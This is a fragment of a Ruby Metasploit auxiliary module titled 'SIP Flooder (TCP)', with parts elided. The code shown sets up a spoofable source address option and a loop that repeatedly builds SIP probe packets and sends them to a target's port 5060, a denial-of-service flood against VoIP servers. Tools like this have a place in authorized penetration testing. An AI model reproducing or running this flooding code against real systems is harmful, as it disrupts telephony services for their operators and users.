...
class Metasploit3 < Msf::Auxiliary
    ...
    def initialize
        super(
            'Name'			=>  'SIP Flooder (TCP)',
            'Version'		=>  '$Revision: 0 $',
            'Description'	=>  'A simple SIP Flooder (TCP), it supports most common types of packets',
        ...
        [
            Opt::RPORT(5060),
            OptAddress.new('SHOST', [false, 'The spoofable source address, only application layer (else randomizes)']),
    ...
    def run
        ...
        while (num <= 0) or (sent < num)
            ...
            to_ext = 100 + rand(899)
            data = create_probe(datastore['METHOD'], rhost, srchost, testext, to_ext, 'TCP')
            sock.put(data)
            sent += 1
            disconnect
        end
